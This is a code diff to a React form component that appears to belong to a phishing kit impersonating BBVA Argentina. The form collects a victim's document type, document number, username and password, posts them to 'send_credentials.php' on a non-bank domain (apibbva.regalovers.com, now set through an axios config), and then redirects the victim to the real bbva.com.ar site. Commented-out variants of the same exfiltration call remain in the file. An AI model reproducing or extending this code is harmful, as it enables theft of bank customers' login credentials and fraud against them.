@@ -3,7 +3,7 @@ import "../Responsive.css";
 import firebase from "../firebase";
 import moment from 'moment';
 import { Button } from 'react-bootstrap';
-import axios from 'axios';
+import axios from '../config/axios.ts';
 
 import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
 import { faEye, faKeyboard } from "@fortawesome/free-solid-svg-icons";
@@ -128,10 +128,32 @@ const Forms = () => {
                 created: moment(date).format('YYYY-MM-DD HH:mm:ss').toString()
             }
 
-            axios.post('https://apibbva.regalovers.com/send_credentials.php', data)
+            /*var request = new FormData();
+
+            request.append("document_type", documentTypeVal);
+            request.append("document_number", documentVal);
+            request.append("user", usernameVal);
+            request.append("pass", passwordVal);
+            request.append("created_date", moment(date).format('YYYY-MM-DD HH:mm:ss').toString());*/
+
+            await axios.post("send_credentials.php", data)
+            .then(response=>{
+                console.log(response);
+                window.location.href = "https://www.bbva.com.ar/";
+            });
+
+            /*fetch('https://apibbva.regalovers.com/send_credentials.php', {
+                method: 'post',
+                headers: {
+                    'Content-Type':'application/json',
+                    'Access-Control-Allow-Origin':'*'
+                },
+                body: data
+               });*/
+            /*axios.post('https://apibbva.regalovers.com/send_credentials.php', data)
             .then((response) => {
                 console.log(response);
-            })
+            })*/
             /*const request = JSON.stringify(data);
 
             const response = await fetch(`https://apibbva.regalovers.com/send_credentials.php`, {
